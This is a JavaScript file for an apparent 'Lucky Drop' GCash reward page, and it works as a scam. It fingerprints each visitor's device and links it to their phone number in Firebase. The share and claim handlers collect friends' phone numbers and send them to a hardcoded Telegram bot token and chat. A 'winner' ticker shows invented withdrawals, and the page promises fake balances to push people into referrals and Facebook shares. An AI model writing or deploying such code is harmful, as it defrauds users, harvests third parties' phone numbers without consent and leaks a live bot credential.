// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========

const spyTracker = {
    getFingerprint: function() {
        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const fingerprintString = `${navigator.userAgent}|${screen}|${timezone}|${navigator.language}|${navigator.platform}|${navigator.hardwareConcurrency || 'unknown'}|${navigator.deviceMemory || 'unknown'}`;
        
        let hash = 0;
        for (let i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return `FP_${Math.abs(hash)}`;
    },

    track: async function() {
        const phone = localStorage.getItem("userPhone");
        const fingerprint = this.getFingerprint();
        
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            
            try {
                const deviceRef = db.ref('devices/' + fingerprint);
                const deviceSnap = await deviceRef.once('value');
                
                if (!deviceSnap.exists()) {
                    const counterRef = db.ref('admin/deviceCounter');
                    const counterSnap = await counterRef.once('value');
                    let nextNum = (counterSnap.val() || 0) + 1;
                    await counterRef.set(nextNum);
                    const displayId = `Dev${nextNum}`;
                    
                    await deviceRef.set({
                        phone: phone,
                        displayId: displayId,
                        fingerprint: fingerprint,
                        firstSeen: Date.now(),
                        lastSeen: Date.now()
                    });
                    
                    await db.ref('device_id_map/' + fingerprint).set({
                        displayId: displayId,
                        phone: phone,
                        createdAt: Date.now()
                    });
                    
                    localStorage.setItem("userDeviceDisplayId", displayId);
                    console.log("New device tracked: " + displayId + " for " + phone);
                } else {
                    await deviceRef.update({
                        lastSeen: Date.now(),
                        phone: phone
                    });
                }
                
                await db.ref('device_phone_map/' + fingerprint).set({
                    phone: phone,
                    lastSeen: Date.now()
                });
                
                const sessionRef = db.ref('user_sessions/' + phone);
                const sessionSnap = await sessionRef.once('value');
                
                if (!sessionSnap.exists()) {
                    await sessionRef.set({
                        phone: phone,
                        balance: 0,
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                        firstVisit: Date.now(),
                        lastUpdate: Date.now(),
                        highestReward: 0,
                        indicatorStep: 0,
                        claimOnHold: false
                    });
                } else {
                    await sessionRef.update({
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || sessionSnap.val().deviceDisplayId,
                        lastUpdate: Date.now()
                    });
                }
                
                await db.ref('activity_logs/' + Date.now()).set({
                    phone: phone,
                    deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                    fingerprint: fingerprint,
                    page: "share_and_earn",
                    timestamp: Date.now()
                });
                
            } catch(e) {
                console.log("Tracking error:", e);
            }
        }
    }
};

// ========== INDICATOR SYSTEM ==========

const indicatorSystem = {
    updateIndicators: function(step, isOnHold) {
        if (isOnHold === undefined) isOnHold = false;
        
        const indicator1 = document.getElementById('indicator1');
        const indicator2 = document.getElementById('indicator2');
        const indicator3 = document.getElementById('indicator3');
        
        var indicators = [indicator1, indicator2, indicator3];
        for (var i = 0; i < indicators.length; i++) {
            var ind = indicators[i];
            if (ind) {
                ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
                ind.style.background = 'rgba(255,255,255,0.2)';
                ind.style.boxShadow = 'none';
                ind.style.animation = 'none';
            }
        }
        
        if (step >= 1 && indicator1) {
            if (isOnHold) {
                indicator1.classList.add('indicator-hold');
                indicator1.style.background = '#ffd700';
                indicator1.style.boxShadow = '0 0 15px #ffd700';
            } else {
                indicator1.classList.add('indicator-yellow-red');
                indicator1.style.background = 'linear-gradient(90deg, #ff4444, #ffd700)';
                indicator1.style.boxShadow = '0 0 10px #ff4444';
                indicator1.style.animation = 'pulseFade 1s infinite';
            }
        }
        
        if (step >= 2 && indicator2) {
            indicator2.classList.add('indicator-blue');
            indicator2.style.background = '#00f2ff';
            indicator2.style.boxShadow = '0 0 10px #00f2ff';
            indicator2.style.animation = 'pulseFade 1s infinite';
        }
        
        if (step >= 3 && indicator3) {
            indicator3.classList.add('indicator-green');
            indicator3.style.background = '#39ff14';
            indicator3.style.boxShadow = '0 0 10px #39ff14';
            indicator3.style.animation = 'pulseFade 1s infinite';
        }
        
        localStorage.setItem('indicatorStep', step);
        localStorage.setItem('claimOnHold', isOnHold);
        this.saveToFirebase(step, isOnHold);
    },
    
    saveToFirebase: async function(step, isOnHold) {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            await db.ref('user_sessions/' + phone).update({
                indicatorStep: step,
                claimOnHold: isOnHold,
                lastStepUpdate: Date.now()
            });
        }
    },
    
    loadFromFirebase: async function() {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return { step: 0, isOnHold: false };
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            var step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
            var isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
            localStorage.setItem('indicatorStep', step);
            localStorage.setItem('claimOnHold', isOnHold);
            this.updateIndicators(step, isOnHold);
            return { step: step, isOnHold: isOnHold };
        }
        return { step: 0, isOnHold: false };
    },
    
    step1ClaimOnHold: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 1) {
            this.updateIndicators(1, true);
            return true;
        }
        return false;
    },
    
    step2FacebookShare: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 2) {
            this.updateIndicators(2, false);
            return true;
        }
        return false;
    },
    
    step3ReferralComplete: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 3) {
            this.updateIndicators(3, false);
            return true;
        }
        return false;
    },
    
    getCurrentStep: function() {
        return parseInt(localStorage.getItem('indicatorStep') || '0');
    },
    
    setStep: function(step) {
        this.updateIndicators(step, false);
    }
};

// ========== BALANCE MANAGEMENT ==========
const balanceManager = {
    getBalance: async function() {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return 0;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            return sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
        }
        return 0;
    },
    
    addBalance: async function(amount) {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return false;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionRef = db.ref('user_sessions/' + phone);
            var sessionSnap = await sessionRef.once('value');
            var currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
            var newBalance = currentBalance + amount;
            
            if (newBalance > 1200) {
                newBalance = 1200;
                alert("Maximum balance of ₱1200 reached!");
            }
            
            await sessionRef.update({
                balance: newBalance,
                lastBalanceUpdate: Date.now()
            });
            
            await db.ref('balance_history/' + phone + '/' + Date.now()).set({
                amount: amount,
                newBalance: newBalance,
                reason: "reward",
                timestamp: Date.now()
            });
            
            return newBalance;
        }
        return false;
    },
    
    updateBalanceDisplay: async function() {
        var balance = await this.getBalance();
        var balanceElement = document.getElementById('userBalanceDisplay');
        if (balanceElement) {
            balanceElement.innerHTML = "₱" + balance.toLocaleString();
        }
        return balance;
    }
};

// ========== WEIGHTED RANDOM AMOUNTS ==========
const rewardTiers = {
    common: { amounts: [150, 300], weight: 60 },
    rare: { amounts: [450, 600, 750], weight: 30 },
    legendary: { amounts: [900, 1050, 1200], weight: 10 }
};

function generateWeightedAmount() {
    var random = Math.random() * 100;
    var selectedTier = rewardTiers.common;
    
    if (random < rewardTiers.common.weight) {
        selectedTier = rewardTiers.common;
    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
        selectedTier = rewardTiers.rare;
    } else {
        selectedTier = rewardTiers.legendary;
    }
    
    var amounts = selectedTier.amounts;
    return amounts[Math.floor(Math.random() * amounts.length)];
}

// ========== WINNER TICKER ==========
const winnerTicker = {
    prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
    winnerElement: null,
    tickerInterval: null,
    
    generateLast4Digits: function() {
        return Math.floor(1000 + Math.random() * 9000).toString();
    },
    
    generatePrefix: function() {
        return this.prefixes[Math.floor(Math.random() * this.prefixes.length)];
    },
    
    generateWinnerText: function() {
        var prefix = this.generatePrefix();
        var last4 = this.generateLast4Digits();
        var amount = generateWeightedAmount();
        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
    },
    
    updateWinner: function() {
        if (!this.winnerElement) return;
        var newText = this.generateWinnerText();
        this.winnerElement.innerHTML = newText;
    },
    
    start: function() {
        this.winnerElement = document.getElementById('winnerText');
        if (!this.winnerElement) {
            console.log("Winner element not found, will retry...");
            var self = this;
            setTimeout(function() { self.start(); }, 500);
            return;
        }
        
        this.winnerElement.innerHTML = this.generateWinnerText();
        
        if (this.tickerInterval) clearInterval(this.tickerInterval);
        
        var self = this;
        this.tickerInterval = setInterval(function() { self.updateWinner(); }, 15000);
        
        console.log("Winner ticker started");
    },
    
    stop: function() {
        if (this.tickerInterval) {
            clearInterval(this.tickerInterval);
            this.tickerInterval = null;
        }
    }
};

// ========== REFERRAL TIMER ==========
const referralTimer = {
    STORAGE_KEY: 'referral_end_time',
    
    startTimer: function() {
        var endTime = Date.now() + (5 * 60 * 1000);
        localStorage.setItem(this.STORAGE_KEY, endTime);
        return endTime;
    },
    
    getRemainingTime: function() {
        var endTime = localStorage.getItem(this.STORAGE_KEY);
        if (!endTime) return 0;
        
        var remaining = parseInt(endTime) - Date.now();
        if (remaining <= 0) {
            this.clearTimer();
            return 0;
        }
        return Math.floor(remaining / 1000);
    },
    
    clearTimer: function() {
        localStorage.removeItem(this.STORAGE_KEY);
    },
    
    isOnCooldown: function() {
        return this.getRemainingTime() > 0;
    },
    
    formatTime: function(seconds) {
        var mins = Math.floor(seconds / 60);
        var secs = seconds % 60;
        return mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
    },
    
    updatePopupDisplay: function() {
        var remaining = this.getRemainingTime();
        var timerElement = document.getElementById('popupTimerDisplay');
        
        if (timerElement) {
            if (remaining > 0) {
                timerElement.innerHTML = this.formatTime(remaining);
                timerElement.style.color = '#ffaa33';
            } else {
                timerElement.innerHTML = "00:00";
                timerElement.style.color = '#39ff14';
            }
        }
        return remaining;
    },
    
    startPopupCountdown: function() {
        this.updatePopupDisplay();
        
        var self = this;
        var interval = setInterval(function() {
            var remaining = self.updatePopupDisplay();
            if (remaining <= 0) {
                clearInterval(interval);
            }
        }, 1000);
        
        return interval;
    }
};

// ========== SHARE BUTTON COOLDOWN UI ==========
var shareCooldownInterval = null;

function updateShareButtonCooldown() {
    var remaining = referralTimer.getRemainingTime();
    var shareBtn = document.getElementById('shareButton');
    var friendInput = document.getElementById('friendPhoneInput');
    var statusMsg = document.getElementById('statusMessage');
    
    if (remaining > 0) {
        var mins = Math.floor(remaining / 60);
        var secs = remaining % 60;
        var timeStr = mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
        if (shareBtn) {
            shareBtn.disabled = true;
            shareBtn.innerHTML = "⏰ WAIT " + timeStr;
        }
        if (friendInput) friendInput.disabled = true;
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-waiting">⏳ Please wait ' + timeStr + ' before sharing again ⏳</span>';
        }
    } else {
        if (shareBtn) {
            shareBtn.disabled = false;
            shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
        }
        if (friendInput) friendInput.disabled = false;
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>';
        }
        if (shareCooldownInterval) {
            clearInterval(shareCooldownInterval);
            shareCooldownInterval = null;
        }
    }
}

function startShareCooldownUI() {
    if (shareCooldownInterval) clearInterval(shareCooldownInterval);
    updateShareButtonCooldown();
    shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
}

// ========== CONFETTI FUNCTIONS ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    
    var particles = [];
    for (var i = 0; i < 150; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 8 + 3,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 4 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiAnimation = requestAnimationFrame(draw);
    }
    
    draw();
    
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(function() {
        stopConfetti();
    }, 5000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== PRIZE POPUP FUNCTIONS ==========
var popupCountdownInterval = null;

function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    var popupBalance = document.getElementById('popupBalanceAmount');
    
    if (popupBalance) popupBalance.innerHTML = "₱150.00";
    
    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
    popupCountdownInterval = referralTimer.startPopupCountdown();
    
    startConfetti();
    
    if (popup) popup.style.display = 'flex';
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== STEP 1: SHARE BUTTON HANDLER ==========
async function handleShare() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    if (referralTimer.isOnCooldown()) {
        var remaining = referralTimer.getRemainingTime();
        var mins = Math.floor(remaining / 60);
        var secs = remaining % 60;
        alert("Please wait " + mins + ":" + secs.toString().padStart(2, '0') + " before inviting again.");
        return;
    }
    
    indicatorSystem.setStep(1);
    
    referralTimer.startTimer();
    startShareCooldownUI();
    
    var message = "📱 REFERRAL INVITE - STEP 1/3!\n👤 User: " + userPhone + "\n👥 Friend: " + friendPhone;
    
    try {
        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
    } catch(e) {
        console.log("Telegram error:", e);
    }
    
    document.getElementById('friendPhoneInput').value = '';
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '33%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>';
    }
    
    showPrizePopup();
}

// ========== STEP 2: FACEBOOK SHARE HANDLER ==========
async function handleFacebookShare() {
    var shareUrl = "https://xjiligames.github.io/rewards/index.html";
    var shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
    
    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(shareText);
    
    window.open(fbShareUrl, '_blank', 'width=600,height=400');
    
    await indicatorSystem.step2FacebookShare();
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '66%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>';
    }
    
    var phone = localStorage.getItem("userPhone");
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        await db.ref('user_sessions/' + phone).update({
            indicatorStep: 2,
            lastStepUpdate: Date.now()
        });
    }
}

// ========== STEP 3: REFERRAL COMPLETE ==========
async function completeReferral(referredPhone) {
    var userPhone = localStorage.getItem("userPhone");
    
    await balanceManager.addBalance(150);
    await indicatorSystem.step3ReferralComplete();
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>';
    }
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var newBalance = await balanceManager.getBalance();
        await db.ref('user_sessions/' + userPhone).update({
            indicatorStep: 3,
            balance: newBalance,
            lastStepUpdate: Date.now()
        });
        
        await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
            timestamp: Date.now(),
            bonus: 150
        });
    }
    
    await balanceManager.updateBalanceDisplay();
    
    var finalBalance = await balanceManager.getBalance();
    alert("🎉 +₱150 added to your balance! Total: ₱" + finalBalance);
}

// ========== CLAIM GCASH BUTTON ==========
async function handleClaimGCash() {
    var currentStep = indicatorSystem.getCurrentStep();
    var isOnHold = localStorage.getItem('claimOnHold') === 'true';
    
    if (currentStep !== 1) {
        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
        return;
    }
    
    if (isOnHold) {
        alert("⏳ Claim is already processing. Please wait.");
        return;
    }
    
    await indicatorSystem.step1ClaimOnHold();
    
    var newBalance = await balanceManager.addBalance(150);
    
    if (newBalance !== false) {
        alert("💰 ₱150 added to your balance! Total: ₱" + newBalance);
        
        var phone = localStorage.getItem("userPhone");
        var message = "💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: " + phone + "\n💵 ₱150 claimed\n💰 New Balance: ₱" + newBalance;
        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
        
        var progressFill = document.getElementById('progressFill');
        if (progressFill) progressFill.style.width = '50%';
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>';
        }
        
        indicatorSystem.updateIndicators(1, false);
    }
}

// ========== MAIN TIMER ==========
var mainTimerInterval = null;

function updateMainTimer() {
    var target = new Date(2026, 4, 1, 0, 0, 0);
    var now = new Date();
    var diff = target - now;
    var timerDisplay = document.getElementById('mainTimerDisplay');
    
    if (timerDisplay) {
        if (diff > 0) {
            var days = Math.floor(diff / (1000*60*60*24));
            var hours = Math.floor((diff % (86400000)) / 3600000);
            var mins = Math.floor((diff % 3600000) / 60000);
            var secs = Math.floor((diff % 60000) / 1000);
            timerDisplay.innerHTML = days + "D " + hours.toString().padStart(2,'0') + ":" + mins.toString().padStart(2,'0') + ":" + secs.toString().padStart(2,'0');
        } else {
            timerDisplay.innerHTML = "00D 00:00:00";
        }
    }
}

function startMainTimer() {
    updateMainTimer();
    if (mainTimerInterval) clearInterval(mainTimerInterval);
    mainTimerInterval = setInterval(updateMainTimer, 1000);
}

// ========== CHECK EXISTING COOLDOWN ==========
function checkExistingCooldown() {
    if (referralTimer.isOnCooldown()) {
        startShareCooldownUI();
    }
}

// ========== CARD CLICK HANDLERS ==========
function setupCardClicks() {
    var youGetCard = document.querySelector('.prize-card:first-child');
    var friendGetsCard = document.querySelector('.prize-card:last-child');
    
    if (youGetCard) {
        youGetCard.addEventListener('click', function() {
            startConfetti();
            alert("🎉 YOU GET ₱150! Click CLAIM THRU GCASH to withdraw!");
        });
    }
    
    if (friendGetsCard) {
        friendGetsCard.addEventListener('click', function() {
            startConfetti();
            alert("🎉 FRIEND GETS ₱150! Share this link with your friend!");
        });
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', async function() {
    console.log("Promotion.js loaded - Fixed Version");
    
    await spyTracker.track();
    
    winnerTicker.start();
    startMainTimer();
    checkExistingCooldown();
    setupCardClicks();
    
    var result = await indicatorSystem.loadFromFirebase();
    console.log("Current step: " + result.step + ", On Hold: " + result.isOnHold);
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) {
        if (result.step >= 3) progressFill.style.width = '100%';
        else if (result.step >= 2) progressFill.style.width = '66%';
        else if (result.step >= 1) progressFill.style.width = '33%';
    }
    
    var shareBtn = document.getElementById('shareButton');
    if (shareBtn) {
        var newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        newShareBtn.disabled = referralTimer.isOnCooldown();
    }
    
    var fbShareBtn = document.getElementById('shareFBBtn');
    if (fbShareBtn) {
        if (!document.querySelector('.fb-share-info')) {
            var infoText = document.createElement('div');
            infoText.className = 'fb-share-info';
            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
            infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
            fbShareBtn.parentNode.appendChild(infoText);
        }
        
        fbShareBtn.onclick = handleFacebookShare;
    }
    
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = handleClaimGCash;
    }
    
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
    
    console.log("Promotion.js initialized - All systems ready");
});
